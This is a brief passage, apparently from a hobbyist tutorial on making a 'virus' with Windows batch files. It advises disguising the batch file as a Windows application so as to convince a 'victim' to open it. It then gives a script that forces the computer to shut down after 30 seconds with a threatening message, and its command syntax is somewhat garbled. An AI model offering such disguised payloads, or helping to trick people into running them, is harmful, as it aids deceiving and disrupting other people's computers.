Hence, your Batch file will be converted into a Windows Application. This will helps in convincing your victim to open the file.

Here is a cool virus code:
@echo off
shutdown -s -t 30 c “Your PC is about to die!” -s

This will shutdown your computer(Only works on Windows) and it will display a message(the text in “ “). It will shutdown the PC in 30sec because I wrote: -t 30. You can change that of course, and you can change the message.
